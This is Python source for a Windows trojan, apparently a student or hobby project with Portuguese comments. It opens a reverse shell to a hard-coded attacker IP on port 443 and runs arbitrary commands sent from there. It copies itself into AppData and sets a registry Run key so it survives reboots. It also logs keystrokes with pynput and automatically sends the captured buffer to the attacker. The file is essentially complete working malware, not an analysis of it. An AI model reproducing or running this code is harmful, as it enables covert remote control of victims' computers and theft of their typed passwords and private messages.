import socket
import subprocess
import os
import shutil
import winreg
import sys
from time import sleep
from pynput import keyboard
from datetime import datetime
# shell reverso
# IP para se conectar com a máquina vitima (Ip ataque)
IP = "192.168.2.116";
# muito utilizada para conexões em sites, e o firewall normalmente deixa passar
# não é regra para todo mundo
PORT = 443;

# %APPDATA%\Microsoft\Windows\
# Software\Microsoft\Windows\CurrentVersion\Run

PROGRAM = "TrojanPersistence";
REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run";
MAX_BUFFER = 500;


key_log_buffer = [];
buffer_auto_send_pending = False;
keylogger_active = False; 
listener = None;

def format_key(key):
    try: 
        return key.char
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]\n',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '',
            keyboard.Key.ctrl: '',
            keyboard.Key.alt: '',
        }
        return special_keys.get(key, f'[{key.name.upper()}]')
    
def on_press(key):
    global key_log_buffer, buffer_auto_send_pending
    
    formatted = format_key(key);    
    if formatted:
        key_log_buffer.append(formatted);
        
    if len(key_log_buffer) >= MAX_BUFFER:   
        buffer_auto_send_pending = True;
        

def get_key_log_data():
    global key_log_buffer;
    
    if not key_log_buffer:
        return "[i] Keylog buffer is empty";
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S");
    data = f"[+ Keylog captured at {timestamp}:\n{''.join(key_log_buffer)}\n";
    key_log_buffer = [];
    return data;

def start_keylogger():
    global listener, keylogger_active;
    
    if keylogger_active:
        return "[i] Keylogger is already running";
    
    listener = keyboard.Listener(on_press=on_press);
    listener.start();
    keylogger_active = True;
    return "[+] Keylogger started successfully";

def stop_keylogger():
    global listener, keylogger_active;
    
    if not keylogger_active:
        return "[i] Keylogger is not running";
    
    if listener:
        listener.stop();
    
    keylogger_active = False;
    return "[+] Keylogger stopped successfully";

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows');
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path);
            
        current_file = sys.executable 
        destination = os.path.join(appdata_path, f'{PROGRAM}.exe');
        
        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination);
            return destination;
        return current_file;
    except Exception as e:
        print("Erro ao copiar para o sistema: ", e);
        return sys.executable;
    
def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_PATH,
            0,
            winreg.KEY_SET_VALUE
        );
        
        winreg.SetValueEx(key, PROGRAM, 0, winreg.REG_SZ, file_path);
        
        winreg.CloseKey(key);
        return True;
    except Exception as e:
        return False;       
    
def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_PATH,
            0,
            winreg.KEY_READ
        );
        value, _ = winreg.QueryValueEx(key, PROGRAM);
        winreg.CloseKey(key);
        return True;
    except FileNotFoundError:
        return False;
    except Exception as e:
        print(f'Error checking persistence: {e}');
        return False;     
    
def setup_persistence():
    try:
        if check_persistence():
            return;
        persistence_path = copy_to_system();
        add_to_registry(persistence_path);
    except Exception as e:
        print(f'Error setting up persistence: {e}');           

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        c.connect((ip, port));
        c.send(b"[#] Client connected\n");
        return c;
    except Exception as e:
        print(f'[!] Error connecting to server: {e}');
    
    

def listen(c):
    global buffer_auto_send_pending;
    try:
        while True:
            if buffer_auto_send_pending:
                data = get_key_log_data();
                c.send(f"[AUTO-SEND] {data}\n[AUTO-SEND]\n".encode());
                buffer_auto_send_pending = False;
                
            c.settimeout(0.5);
            
            try:
                data = c.recv(1024).decode().strip();
                if data == "/exit":
                    return;
                else:
                    cmd(c, data);
            except socket.timeout:
                continue;
                
    except Exception as e:
        print(f'[!] Error receiving data: {e}');    
    
    
def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip());
            c.send(b"[i] Changed directory to");
            return 
        
        elif data == "/persistence status":
            if check_persistence():
                c.send(b"[+] Persistence Status:\n[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_PATH}\\{PROGRAM}\n\t[+] Status: Active\n\n".encode());
            else:
                c.send(b"[!] Persistence not found.\n\n");
                return
        elif data == "/persistence setup":
            setup_persistence();
            c.send(b"[+] Persistence setup completed.\n\n");
            return
        
        elif data == "/keylogger start":
            response = start_keylogger();
            c.send(response.encode() + b"\n\n");
            
        elif data == "/keylogger stop":
            response = stop_keylogger();
            c.send(response.encode() + b"\n\n");
            return;
        
        elif data == "/keylogger dump":
            response = get_key_log_data();
            c.send(response.encode() + b"\n\n");
            return
        
        elif data == "/keylogger status":
            status = "Running" if keylogger_active else "Stopped";
            buffer_size = len(key_log_buffer);
            response = f"[+] keylogger status: {status}\n[i] Buffer: {buffer_size} keys";
            c.send(response.encode() + b"\n\n");
            return;
        else:
            p = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr= subprocess.PIPE, stdout= subprocess.PIPE);
            output = p.stdout.read() + p.stderr.read();
            if output:
                c.send(output + b"\n");
            else:
                c.send(b"[i] Command executed, but no output was returned.\n\n");    
    except Exception as e:
        print("Erro ao executar comando: ", e);    
    
        
        
if __name__ == "__main__":
    try:
        setup_persistence();
        while True:
            client = connect(IP, PORT);
            if client:
                listen(client);
            else:
                sleep(5)
    except KeyboardInterrupt:
        print("[!] Program stopped by user.");            
    except Exception as e:
        print("[!] Main connection error: ", e);            

